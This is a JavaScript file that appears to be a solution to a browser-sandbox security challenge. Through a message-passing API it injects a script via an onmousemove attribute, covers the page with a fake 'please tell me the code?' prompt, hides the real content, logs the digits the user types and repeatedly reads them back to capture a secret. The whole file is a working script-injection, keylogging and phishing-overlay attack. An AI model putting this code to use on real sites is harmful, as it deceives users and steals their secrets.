// API calls

function read(selector) {
  postMessage({'read': {'selector': selector}});
}

function capture(guess) {
  postMessage({'capture': {'secret': guess}});
}

function setAttr(selector, name, value) {
  postMessage({'setAttr': {'selector': selector, 'name': name, 'value': value}});
}

function append(selector, name) {
  postMessage({'append': {'selector': selector, 'name': name}});
}

function setAttrs(selector, attrs) {
  for (var name in attrs) {
    setAttr(selector, name, attrs[name]);
  }
}

var prefix = makeId();
var waitingForInit = true;

onmessage = function(e) {
  if (e.data.innerHTML) {
    var text = e.data.innerHTML.trim();
    for (var i = 0; i < text.length - 1; i++) {
      capture(text.substr(i));
    }
    if (text == prefix + '_init') {
      waitingForInit = false;
    }
  }
};

// DOM manipulation

function randRange(low, high) {
  return Math.floor(low + Math.random() * (high - low));
}

function makeId() {
  return 'x' + randRange(0, 100000000);
}

function makeDiv(attrs) {
  var id = makeId();
  append('body', id);
  setAttrs(id, attrs);
  return id;
}

// JS execution

function jsQuote(js) {
  return '"' + js.replace(/\\/g, '\\\\').replace(/"/g, '\\"').replace(/\n/g, '\\n') + '"';
}

function executeJs(js) {
  var execSel = makeDiv({
    'style': 'position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 2147483647',
    'class': prefix
  });
  js += '; document.querySelector("' + execSel + '").style.display = "none";';
  setAttr(execSel,
          'onmousemove',
          's = document.createElement("script"); ' +
          's.innerHTML = ' + jsQuote(js) + '; ' +
          'document.querySelector("body").appendChild(s)')
}

// the stuff

var keyReaderSel = makeDiv({
  'style': 'position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 2147483647',
  'class': prefix});

var receiverSel = makeDiv({
  'style': 'display: none'
});

function init() {
  executeJs(`

if (!window.__prefix___init) {
  function randRange(low, high) {
    return Math.floor(low + Math.random() * (high - low));
  }

  var k = document.querySelector('__keyReaderSel__');
  var r = document.querySelector('__receiverSel__');

  var kw = k.offsetWidth, kh = k.offsetHeight;
  var iw = randRange(300, 500), ih = randRange(200, 400);
  var ix = (kw - iw)/2, iy = (kh - ih)/2 - 20;

  var html = '<div class="__prefix__" style="padding: 6px; border: 1px solid #888; border-radius: 4px; font-family: helvetica; font-size: 16px; line-height: 24px; text-align: center; position: absolute; left: ' + ix + '; top: ' + iy + '"><img class="__prefix__" src="http://placekitten.com/' + iw + '/' + ih + '"><div class="__prefix__">please tell me the code?</div><input class="__prefix__" style="font-size: 16px" size=12><input class="__prefix__" style="font-size: 16px" type=submit value="please?"><span id="__prefix___init" style="display: none">__prefix___init</span></div>';
  k.innerHTML = html;
  k.addEventListener('keyup', function(e) {
    if (event.keyCode >= 48 && event.keyCode <= 57) {
      r.innerText += ('' + (event.keyCode - 48));
    }
    if (event.keyCode == 8) {
      r.innerText = r.innerText.replace(/.$/, '');
    }
  }, true);

  function popInFront() {
    var nodes = document.querySelectorAll('*');
    for (var i = 0; i < nodes.length; i++) {
      var n = nodes[i];
      var name = n.nodeName.toLowerCase();
      if (name != 'html' && name != 'body' && name != 'script' &&
          n.className != '__prefix__') {
        n.style.opacity = 0.2;
        n.style.zIndex = -1000;
      }
    }
    k.style.display = 'absolute';
    k.style.zIndex = 2147483647;
    setTimeout(popInFront, 1);
  }
  popInFront();

  window.__prefix___init = true;
}

`.replace(/__keyReaderSel__/g, keyReaderSel
).replace(/__receiverSel__/g, receiverSel
).replace(/__prefix__/g, prefix
));
  if (waitingForInit) {
    read('#__prefix___init');
    setTimeout(init, 1000);
  }
}
setTimeout(init, 1000);

// Capturing the secret

function nextAttempt() {
  read(receiverSel);
  setTimeout(nextAttempt, 10);
}
nextAttempt();
